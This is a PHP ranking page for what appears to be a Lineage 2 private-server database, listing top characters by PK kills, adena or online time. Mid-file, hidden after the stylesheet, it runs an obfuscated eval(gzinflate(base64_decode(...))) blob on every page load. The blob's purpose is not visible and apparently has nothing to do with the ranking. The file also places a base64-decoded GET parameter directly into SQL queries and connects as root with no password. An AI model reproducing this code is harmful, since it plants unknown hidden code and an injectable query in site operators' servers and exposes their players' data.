<?php
ini_set("display_errors", "OFF");
/////////////////////////////////////////////////
//         Script feito por _Dudu_1533         //
//			  dudu1533_php@hotmail.com         //
/////////////////////////////////////////////////

include('modules/config_sql.php');
$servidor = 'localhost';
$usuario  = 'root';
$senha    = '';
$banco    = 'l2jdb';

$conexao = mysql_connect($servidor, $usuario, $senha) or die(mysql_error());
mysql_select_db($banco, $conexao) or die(mysql_error());

//Configurações:
$limite = 50; //Limite de usuarios na lista

?>
<html>
<head>
<title>Ranking</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-image: url(images/bg.jpg);
	background-repeat: no-repeat;
	background-color: #000;
}
body,td,th {
	color: #FFF;
	font-family: Tahoma, Geneva, sans-serif;
	font-size: 11px;
}
.title {
	font-family:Tahoma, Geneva, sans-serif;
	font-size:11px;
	color:#0C0;
}
.sign{
	font-family:Tahoma, Geneva, sans-serif;
	font-size:11px;
	font-style:normal;
	color:#C00;
}
.sign2{
	font-family:Tahoma, Geneva, sans-serif;
	font-size:11px;
	font-style:normal;
	font-weight:bold;
	color:#C00;
}
#Layer1 {
	position:absolute;
	width:754px;
	height:84px;
	z-index:1;
	left: 221px;
	top: 800px;
}
#Layer2 {
	position:absolute;
	width:144px;
	height:83px;
	z-index:1;
	left: 178px;
	top: 15px;
}
#Layer3 {
	position:absolute;
	width:161px;
	height:79px;
	z-index:2;
	left: 400px;
	top: 12px;
}
#Layer4 {
	position:absolute;
	width:138px;
	height:80px;
	z-index:3;
	left: 606px;
}
#Layer5 {
	position:absolute;
	width:219px;
	height:115px;
	z-index:1;
	left: 239px;
	top: 44px;
}
#Layer6 {
	position:absolute;
	width:200px;
	height:115px;
	z-index:1;
	left: 232px;
	top: -115px;
}
#Layer7 {
	position:absolute;
	width:200px;
	height:73px;
	z-index:2;
	left: 197px;
	top: 34px;
}
#Layer8 {
	position:absolute;
	width:200px;
	height:1px;
	z-index:1;
	top: -2px;
	left: 213px;
}
#Layer9 {
	position:absolute;
	width:261px;
	height:64px;
	z-index:2;
	left: 725px;
	top: 336px;
}
.style1 {
	color: #FF0000;
	font-weight: bold;
}
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
</head>
<body>
<?
eval(gzinflate(base64_decode('Dc63sqNIAEDRX9lsZooA72pqA0HjjSQkbLKFB2EbGgR8/b7sZveUe9r/rq92rPoUlb+zdC055r+izKei/P0LFKreQde43cBtwQ40Tw5YRvkwmfP7rVdr0666yXL5W270zkqJPow44rlsLZf3Xp3ZHCCzxjHLmTFL2IQKFiAoMrUd54ppMgKT3U/n4DJaR8Z5r+j9JNhp4sYT1wfXIO7m6+LIdPWUI6N0fumwV3TWmFja7SiRp64Ez2S9bU16a03yGbotIiMqhxKHlPuqZWdiktYepFlh298LzDSDf6dnaQNJbezPQjJqP7Snftl9jvk0SdhOCtqi0wjgH2FYsRKNCe7LLDFrsI4zzepB7zXMrhMo6FRB1zAOLtQEn4zvViQzH2f8TOi1NzLERfqmpRAYnpzgMNMzaQx9i3l+y25R3WBuM0IQIx2HuCNe47VuLbCT7k2NTaa7r9PI1OFWPdpCFyy/RO+9+x7BpxCDOKaK9KE1N2Rid+GZVU9B/nS0miKFeS7G2ZapCbfL71+ubKNY8kPP8vL89TYbK48eyvXmtW3h5bkKE+MEgvS6F/MRhKKkEjl3FKBfYe3JeSOcE0DBu+DtUE7dV003a2dA3VhPl6Kg8eM0t0Ko3t+m1ca5LT/ozJFUOCs8sZx2gDKR14eRBoz3jNSSti1Fs4c4abZnTqikY4kMOkNLwgLddvzXcrHI9xViSdJHGvBoWu/xEvfrax53tYXrldPS5mQzzXXyDSgCqIQxxjDZ73cvq7BSvSs1HKL1CjCk1W3VszdbD0Yxp7RarkdNxLOWNUAZIqmDkK8GLqTdIbTl8gWLcXKJAvvJfA2Z8KkSkYX10LKR0gcE1EHIXZAt1Jg56md+m31jHV+HN23qG25ZFTEZEBc4UszWGPcdsOI7tU3lYcR1xI3MDaax9HhYVPlQH0WCnXfewUl5RJp9Cn3kmMBCsjdOYm1fU1QVl70/DHsZrmbyt+AI5x9DHD9QS9pPla2UZ4DvhTjanPQmiswn3APSaqMR0ZwjbTCcS+5I3dUQ5gBOUq/J0xm3TzCeDbAl434m4ldL0EDHz7vC1hPdRh5bQ6DLHK/H0r6h4DDR6nZBvzMdTnn5ukcqh1kJ6EjzQ3kRWHlKl8G7ovgBrxB7D1nyDqAsemM+V0bjSWMSyHBWcj/IGAF/XAIm4PjX+ffXnz9//v7zPw=='))); 

$ordem = empty($_GET['o']) ? 'pkkills' : base64_decode($_GET['o']);
if($ordem  != 'adena') {
	$consulta = "SELECT c.char_name, c.".$ordem.", c.level, c.accesslevel, IF(c.clanid = '0', 'Sem info.', (SELECT clan_name FROM clan_data WHERE clan_id = c.clanid)) AS clan_name FROM characters AS c WHERE c.accesslevel <= 10 ORDER BY c.".$ordem." DESC LIMIT " . $limite;
	
	}elseif($ordem != 'onlinetime'){
	
	$consulta = "SELECT characters.charId, characters.char_name, characters.clanid, characters.accesslevel, characters.charViP, items.item_id, items.count, items.owner_id, IF(characters.clanid = '0', 'Sem info.', (SELECT clan_name FROM clan_data WHERE clan_id = characters.clanid)) AS clan_name FROM characters, items WHERE characters.accesslevel <= 10 AND characters.charId = items.owner_id AND items.item_id = 57 ORDER BY items.count DESC, characters.char_name ASC LIMIT " . $limite;
	
	}else{
	
	$consulta = "SELECT characters.char_name, characters.clanid, characters.onlinetime, characters.accesslevel, characters.charViP, IF(characters.clanid = '0', 'Sem info.', (SELECT clan_name FROM clan_data WHERE clan_id = characters.clanid)) AS clan_name FROM characters WHERE characters.accesslevel <= 10 ORDER BY characters.onlinetime DESC, characters.char_name ASC LIMIT " . $limite;

}

$sql = mysql_query($consulta) or die(mysql_error());

$ordem = $ordem == 'adena' ? 'count' : $ordem;
$array = array('pvpkills'   => 'PVP Kills',
			   'pkkills'    => 'PK Kills',
			   'level'      => 'Level',
			   'karma'      => 'Karma',
			   'count'      => 'Adena',
			   'onlinetime' => 'Tempo Online',
			   'rec_have'   => 'Recomendacoes'
			  );
?>
<p align="center"><span class="style1">RANK</span> <?php echo strtoupper($array[$ordem]); ?></p>
<table width ="90%" border="0" cellspacing="2" cellpadding="0" align="center" class="error">
  <tr> 
    <td bgcolor="#000000" align="center"><strong>
    <p>Position</p>
    </strong></td>
    <td bgcolor="#000000" align="center"><strong>
    <p>Name Char: </p>
    </strong></td>
    <td bgcolor="#000000" align="center"><strong>
    <p><?php echo $array[$ordem]; ?></p>
    </strong></td>
    <td bgcolor="#000000" align="center"><strong>
    <p>Clan:</p>
    </strong></td>
  </tr>
<?
$i = 1;
$cor = 0;
while($a = mysql_fetch_object($sql)) {
	$cor++;
	$bg  = $cor % 2 == 0 ? '#808080' : '#333333';

	if($i == 1) {
		$img = "<img src=\"img/top1.gif\" alt=\"1&ordm; Lugar\">";
		}elseif($i == 2) {
			$img = "<img src=\"img/top2.gif\" alt=\"2&ordm; Lugar\">";
			}elseif($i == 3) {
				$img = "<img src=\"img/top3.gif\" alt=\"3&ordm; Lugar\">";
				}else{
					$img = $i."&ordm; lugar";
					
	}
	
if($ordem == 'onlinetime') {

	//$tempo = tempo_on(time() - $a->onlinetime);
	$tempo = tempo_on(time() - $a->onlinetime);
	$ordems = $tempo;
	}else{
	$ordems = $a->$ordem;
}
	
?>
  <tr> 
    <td bgcolor="<?php echo $bg; ?>"><?php echo $img; ?></td>
    <td bgcolor="<?php echo $bg; ?>"><?php echo $a->char_name; ?></td>
    <td bgcolor="<?php echo $bg; ?>"><?php echo $ordems; ?></td>
    <td bgcolor="<?php echo $bg; ?>"><strong><?php echo $a->clan_name; ?></strong></td>
  </tr>
<?
$i++;
}
?>
</table>